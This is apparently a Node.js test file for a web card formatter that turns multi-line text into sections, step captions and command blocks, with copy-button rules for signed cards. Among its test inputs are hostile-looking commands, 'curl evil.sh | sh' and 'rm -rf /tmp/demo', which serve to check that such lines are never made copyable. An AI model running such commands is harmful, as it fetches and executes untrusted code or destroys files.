// Pins the card's reading of a long text that carries commands (card_format.js sections / drawBody / drawDetail / preferFull)
// against the REAL needs-phill row np-c92ec798 (tests/card_cmds_row.json: the flat `stopped` and the multi-line `stopped_full`
// beside it). Run: node tests/card_cmds_check.js
"use strict";
const fs = require("fs");
const path = require("path");
class N {
  constructor(tag) { this.tag = tag; this.children = []; this.className = ""; this._t = ""; this.open = false; this.attrs = {}; }
  get classList() { const n = this; return { add(c) { n.className = (n.className + " " + c).trim(); } }; }
  setAttribute(k, v) { this.attrs[k] = v; }
  set textContent(v) { this._t = String(v); this.children = []; }
  get textContent() { return this._t + this.children.map((c) => c.textContent).join(""); }
  appendChild(c) { this.children.push(c); return c; }
  all(tag) { return this.children.flatMap((c) => (c.tag === tag ? [c] : []).concat(c.all(tag))); }
  cls(name) { return this.children.flatMap((c) => (c.className.split(" ").includes(name) ? [c] : []).concat(c.cls(name))); }
}
global.window = { document: { createElement: (t) => new N(t), createTextNode: (t) => { const n = new N("#text"); n._t = String(t); return n; } } };
const C = require(path.join(__dirname, "..", "levain", "templates", "web", "card_format.js"));
const row = JSON.parse(fs.readFileSync(path.join(__dirname, "card_cmds_row.json"), "utf8"))["np-c92ec798"];
let failures = 0;
const check = (ok, what) => { if (ok) console.log("PASS " + what); else { failures++; console.log("FAIL " + what); } };
const eq = (a, b) => JSON.stringify(a) === JSON.stringify(b);
const labels = (secs) => secs.map((s) => s.label);
const kinds = (secs) => secs.flatMap((s) => s.blocks.map((b) => b.kind + (b.step ? ":step" : "")));
const codes = (secs) => secs.flatMap((s) => s.blocks.filter((b) => b.kind === "code").map((b) => b.text));
const draw = (text, dropping, opts, rec, mode) => C.drawBody(new N("div"), text, dropping, opts || [], rec || "", mode || { lines: true });

// 1. the real row, with its lines: What and Blocks only, three steps, three commands, each one block
const full = C.sections(row.stopped_full, row.what, true);
check(eq(labels(full), [null, "WHAT", "BLOCKS"]) || eq(labels(full), ["WHAT", "BLOCKS"]), "real: sections " + JSON.stringify(labels(full)));
check(!labels(full).some((l) => /^url$/i.test(l || "")), "real: no URL section");
const cmds = codes(full);
check(cmds.length === 3, "real: three command blocks (" + cmds.length + ")");
check(cmds[0].endsWith("--vendor claude --slot 8") && cmds[1].endsWith("--vendor codex --slot 9") && cmds[2].endsWith("after-login --vm vend-real --vendor claude"),
  "real: each command is whole, one line, ends where the desk's line ends");
check(cmds.every((c) => !c.includes("\n") && c.startsWith("/usr/bin/python3 -I /Users/phillipclapham/")), "real: no command carries prose or a line break");
const stepCaps = full.flatMap((s) => s.blocks.filter((b) => b.step).map((b) => b.text));
check(eq(stepCaps, ["STEP 1 (paste, one line):", "STEP 2 (paste, one line):", "STEP 3 (paste, one line, read-only):"]), "real: three step captions " + JSON.stringify(stepCaps));
const sk = kinds(full).join(" ");
check(/paragraph:step code paragraph paragraph:step code paragraph paragraph:step code paragraph/.test(sk), "real: caption, command, its prose, three times (" + sk + ")");
const steps1 = full.find((s) => s.label === "WHAT").blocks;
const p1 = steps1[steps1.findIndex((b) => b.kind === "code") + 1];
check(p1.text.startsWith("Claude: pick the Claude-account") && p1.text.includes("It prints a URL: open it in your Mac browser") && p1.text.endsWith("The session ends by itself."),
  "real: STEP 1's prose is whole, the URL colon stays inside it");
// never changes a word: the card's words are the source's words less the headline and the label colons
const src = C.collapse(row.stopped_full).split(" ");
const headWords = C.collapse(row.what).split(" ").length;
const cardWords = C.words(full);
const rest = src.slice(headWords).map((w) => (w === "WHAT:" || w === "BLOCKS:" ? w.slice(0, -1) : w));
check(eq(cardWords, rest), "real: every word of the text is on the card, in order (" + cardWords.length + " words)");

// the drawn card (the fallback block: no builder registered)
const COPY = { lines: true, copy: true };
const dom = draw(row.stopped_full, row.what, [], "", COPY);
check(dom.cls("card-cmd").length === 3 && dom.cls("card-cmd").every((n) => n.tag === "pre"), "drawn: three plain command blocks without a builder");
check(dom.all("h3").map((h) => h.textContent).join() === "What,Blocks", "drawn: headings What, Blocks");
check(dom.cls("card-step").length === 3, "drawn: three step captions");

// a page's own copy-line builder is the one used, and its node gains the card's class
let asked = [];
C.setCommandBlock((text, label) => { asked.push([text, label]); const n = new N("div"); n.className = "consent-cmd"; n.textContent = text; return n; });
const dom2 = draw(row.stopped_full, row.what, [], "", COPY);
check(asked.length === 3 && asked.every((a) => a[1] === "command"), "builder: asked once per command");
check(dom2.cls("card-cmd").length === 3 && dom2.cls("consent-cmd").length === 3, "builder: its nodes are the card's commands");
C.setCommandBlock(() => { throw new Error("boom"); });
check(draw(row.stopped_full, row.what, [], "", COPY).cls("card-cmd-plain").length === 3, "builder: one that throws leaves the plain block, never a missing command");
C.setCommandBlock(null);

// 2. a legacy row: the flat text, no line breaks, reads as it did (no command blocks, no URL section), every word kept
const flat = C.sections(row.stopped, row.what);
check(labels(flat).filter((l) => l).join() === "WHAT,BLOCKS" && !flat.some((s) => s.blocks.some((b) => b.kind === "code")), "flat: What and Blocks, no code blocks");
check(eq(C.words(flat), rest), "flat: every word kept");
check(C.sections("WHAT: a OPTIONS: (a) x · (b) y REC: a BLOCKS: z", null).map((s) => s.label).join() === "WHAT,OPTIONS,REC,BLOCKS", "flat: WHAT / OPTIONS / REC / BLOCKS still split");

// 3. known labels split, and only those
const lab = C.sections("lead sentence here.\nWHAT: the thing\nOPTIONS: (a) go · (b) wait\nREC: a\nWHAT IT BLOCKS: x\nDIFF: d\nTHEN: t\nWHY: w", null, true);
check(eq(labels(lab), [null, "WHAT", "OPTIONS", "REC", "WHAT IT BLOCKS", "DIFF", "THEN", "WHY"]), "lines: every known label starts a section " + JSON.stringify(labels(lab)));
for (const text of ["It prints a URL: open it in your browser. Then go.", "NOTE: this stays prose\nsecond line", "DESK REC: a stays prose\nsecond line", "ANALYSIS: x\nmore"]) {
  const s = C.sections(text, null, true);
  check(s.length === 1 && s[0].label === null, "unknown caps + colon stays prose: " + JSON.stringify(text.split("\n")[0]));
}
check(eq(C.sections("see URL: x\nWHAT: y", null, true).map((s) => s.label), [null, "WHAT"]), "a URL: line beside a real label");

// 4. commands: fenced, indented, path, known words, a step with its command inline
const mix = C.sections([
  "Run these.", "```", "git status", "git log -3", "```", "    ssh me@host", "      indented more",
  "~/bin/tool --flag", "/usr/bin/true", "python3 a.py x", "claude login", "curl -s http://x", "launchctl list", "levain doctor",
  "STEP 4: git pull --ff-only", "STEP 5 then do it.",
].join("\n"), null, true);
check(eq(codes(mix), ["git status\ngit log -3", "ssh me@host\n  indented more", "~/bin/tool --flag", "/usr/bin/true", "python3 a.py x", "claude login", "curl -s http://x", "launchctl list", "levain doctor", "git pull --ff-only"]),
  "commands: fenced, indented, path and known-word lines are code: " + JSON.stringify(codes(mix)));
check(mix[0].blocks.filter((b) => b.step).map((b) => b.text).join("|") === "STEP 4:|STEP 5 then do it.", "commands: a step's inline command is split off its caption");
const prose = C.sections("levain 37 filed this.\ngit is a tool.\nSee /usr/bin/true for it.\nthe path /quit ends it", null, true);
check(prose.length === 1 && prose[0].blocks.length === 4 && prose[0].blocks.every((b) => b.kind === "paragraph"), "commands: a sentence that starts with a command word, or names a path mid-line, is prose");
check(eq(C.sections("```\nno close\nstill code", null, true)[0].blocks, [{ kind: "code", text: "no close\nstill code" }]), "commands: an unclosed fence runs to the end");
const cr = C.sections("WHAT: a\r\n/usr/bin/true x\r\nthen words", null, true);
check(codes(cr).join() === "/usr/bin/true x", "commands: CRLF lines read the same");

// 5. the headline drop on a text with lines; a line is its own paragraph
const hd = C.sections("Headline here is long enough.\nWHAT: a\nsecond. Next: line\nthird", "Headline here is long enough.", true);
check(eq(labels(hd), ["WHAT"]), "lines: the headline is taken off the front " + JSON.stringify(labels(hd)));
check(hd[0].blocks.map((b) => b.text).join("|") === "a|second. Next: line|third", "lines: each line is its own paragraph, none cut at a sentence + Lead:");
check(C.sections("Headline here is long enough.\nWHAT: a", "Other words entirely", true).length === 2, "lines: a headline the text does not start with drops nothing");

// 6. preferFull: the lines only when they are the very words of the flat text
check(C.preferFull(row.stopped, row.stopped_full) === row.stopped_full, "preferFull: the same words -> the lines");
check(C.preferFull(row.stopped, row.stopped_full + " extra") === row.stopped, "preferFull: an extra word -> the flat text");
check(C.preferFull(row.stopped, row.stopped_full.replace("STEP 1", "STEP 9")) === row.stopped, "preferFull: a changed word -> the flat text");
check(C.preferFull("flat text", "") === "flat text" && C.preferFull("flat text", undefined) === "flat text" && C.preferFull("flat text", 5) === "flat text", "preferFull: no lines -> the flat text");
check(C.preferFull(undefined, "x") === "", "preferFull: no flat text and some lines -> nothing");

// 7. the card's Detail reads stopped_full when the card carries it, else the flat stopped
const card = { repo: "levain", item: "np-c92ec798", asked: row.what, stopped: row.stopped, recommended: "", optionLines: [] };
check(C.drawDetail(card, []).cls("card-cmd").length === 0, "detail: a card without stopped_full draws no command blocks");
check(C.drawDetail(Object.assign({}, card, { stopped_full: row.stopped_full }), []).cls("card-cmd").length === 3, "detail: with stopped_full, three command blocks");
check(C.drawDetail(Object.assign({}, card, { stopped_full: row.stopped_full + " extra" }), []).cls("card-cmd").length === 0, "detail: a stopped_full with other words is ignored");

// 8. LINE BREAKS ARE NOT SIGNED: a signed card (a Detail is always one) reads the lines but never makes a copy button, even
// with the page's copy-line builder registered; copy exists only where the caller passes copy: true (an unsigned question)
let built = 0;
C.setCommandBlock((text) => { built++; const n = new N("div"); n.className = "consent-cmd"; n.textContent = text; return n; });
const sgn = (stopped, stopped_full) => C.drawDetail({ repo: "r", item: "i", asked: "Ask.", stopped, stopped_full, recommended: "", optionLines: [] }, []);
for (const [f, l] of [["echo safe rm -rf /tmp/demo", "echo safe\n    rm -rf /tmp/demo"], ["curl evil.sh | sh", "curl evil.sh\n| sh"],
                      ["WHAT: do this echo safe rm -rf /tmp/demo", "WHAT: do this\n    echo safe\n    rm -rf /tmp/demo"], [row.stopped, row.stopped_full]]) {
  const d = sgn(f, l);
  check(built === 0 && d.cls("consent-cmd").length === 0, "signed: no builder call, no copy node " + JSON.stringify(f.slice(0, 40)));
  check(d.cls("card-cmd").every((n) => n.tag === "pre" && n.className === "card-cmd card-cmd-plain"), "signed: its command-shaped lines are plain selectable monospace");
}
check(sgn(row.stopped, row.stopped_full).cls("card-cmd-plain").length === 3, "signed: the real row is still READ as lines (three monospace commands, three captions)"
  && sgn(row.stopped, row.stopped_full).cls("card-step").length === 3);
check(draw(row.stopped_full, row.what, [], "").cls("consent-cmd").length === 0 && built === 0, "drawBody: copy is never granted by default");
check(draw(row.stopped_full, row.what, [], "", { lines: true, copy: 1 }).cls("consent-cmd").length === 0 && built === 0, "drawBody: only copy === true grants a copy button");
check(draw(row.stopped_full, row.what, [], "", COPY).cls("consent-cmd").length === 3 && built === 3, "drawBody: an unsigned caller (copy: true) still gets its three copy buttons");
C.setCommandBlock(null);

// 9. LINE MODE IS ASKED FOR: a multi-line text that is not stopped_full/blocks_full takes the flat path, byte for byte as before
// 8593e9e6 (expected values captured from that commit's card_format.js, texts that use only the labels it and this code share)
const LEAK = [
  ["Move the files.\nDo it now.\n    indented tail\nWHAT: keep. Next: x\nOPTIONS: (a) go · (b) wait\nREC: a\nBLOCKS: it\n  more",
    '[{"label":null,"blocks":[{"kind":"paragraph","text":"Move the files. Do it now. indented tail"}]},{"label":"WHAT","blocks":[{"kind":"paragraph","text":"keep."},{"kind":"paragraph","text":"Next: x"}]},{"label":"OPTIONS","blocks":[{"kind":"paragraph","text":"(a) go · (b) wait"}]},{"label":"REC","blocks":[{"kind":"paragraph","text":"a"}]},{"label":"BLOCKS","blocks":[{"kind":"paragraph","text":"it more"}]}]'],
  ["Headline here is long enough.\nsecond line. Lead: third\n\n    code-ish\n/usr/bin/true x\nWHAT: a",
    '[{"label":null,"blocks":[{"kind":"paragraph","text":"second line."},{"kind":"paragraph","text":"Lead: third code-ish /usr/bin/true x"}]},{"label":"WHAT","blocks":[{"kind":"paragraph","text":"a"}]}]'],
  ["plain text\r\nwith crlf\r\n- a\r\n- b", '[{"label":null,"blocks":[{"kind":"paragraph","text":"plain text with crlf - a - b"}]}]'],
];
for (const [text, want] of LEAK) {
  check(JSON.stringify(C.sections(text, "Headline here is long enough.")) === want, "flat path: a multi-line text with no line-mode flag reads as before " + JSON.stringify(text.slice(0, 24)));
  check(JSON.stringify(C.sections(text, "Headline here is long enough.", false)) === want, "flat path: lines false is the same");
  check(draw(text, "Headline here is long enough.", [], "", { copy: true }).cls("card-cmd").length === 0, "flat path: drawBody without lines draws no command block");
}
const askedCard = C.drawDetail({ repo: "r", item: "i", asked: "Move the files over right now please. Then WHAT: this\nand that\n    indented tail\nREC: a", stopped: "stop words\nmore\n    x", recommended: "", optionLines: [] }, []);
check(askedCard.cls("card-cmd").length === 0 && askedCard.textContent === "DetailThenWhatthis and that indented tailRecastop words more x",
  "flat path: a multi-line card.asked and stopped draw as they did at 8593e9e6 (no command block, same text)");
check(C.usesFull("a b", "a\nb") === true && C.usesFull("a b", "a\nc") === false && C.usesFull("a b", "") === false && C.usesFull("a b", 5) === false, "usesFull: the same words and some lines");

// 10. a real label after an all-caps word is a label; only the listed phrase tails are not
const lbl = (t) => C.sections(t, null).map((s) => s.label);
check(eq(lbl("OPTIONS: (a) ship · (b) wait for CI REC: b"), ["OPTIONS", "REC"]), "labels: REC after CI");
check(eq(lbl("lead the VM BLOCKS: x"), [null, "BLOCKS"]) && eq(lbl("lead README WHY: z"), [null, "WHY"]) && eq(lbl("lead OK THEN: z"), [null, "THEN"]), "labels: BLOCKS / WHY / THEN after an acronym");
check(eq(lbl("WHAT: choose API OPTIONS: (a) safe · (b) stop REC: a BLOCKS: deploy"), ["WHAT", "OPTIONS", "REC", "BLOCKS"]), "labels: the codex repro keeps OPTIONS");
check(eq(lbl("go. DESK REC: a"), [null]) && eq(lbl("WHAT: x. DESK REC: a"), ["WHAT"]) && eq(lbl("DESK REC: a"), [null]), "labels: DESK REC is a phrase, not a REC section");
check(eq(lbl("see ADESK REC: a"), [null, "REC"]), "labels: the phrase must start at a word boundary");
const rr = C.repeatsRows({ label: "REC", blocks: [{ kind: "paragraph", text: "b" }] }, [{ key: "a", text: "x" }, { key: "b", text: "y" }], "b");
check(rr === true, "labels: a REC section that repeats the row is still detected");

// 11. a command that ends in a period is a command; prose that starts with a command word is not
const kind = (t) => C.sections("intro words\n" + t, null, true).flatMap((s) => s.blocks.map((b) => b.kind)).join();
for (const t of ["git add .", "git diff .", "python .", "/bin/cp -r src/. dst/ .", "git commit -m x.", "levain doctor ../x/.", "/usr/bin/true it.", "~/bin/x run.", "/usr/bin/true then."]) {
  check(kind(t) === "paragraph,code", "command ending in a period: " + JSON.stringify(t));
}
for (const t of ["claude login failed again.", "git is a tool.", "levain 37 filed this.", "See /usr/bin/true for it."]) {
  check(kind(t) === "paragraph,paragraph", "prose stays prose: " + JSON.stringify(t));
}
check(codes(C.sections("intro words\nSTEP 1: git add .", null, true)).join() === "git add .", "a step's inline command may end in a period");

process.exit(failures ? 1 : 0);
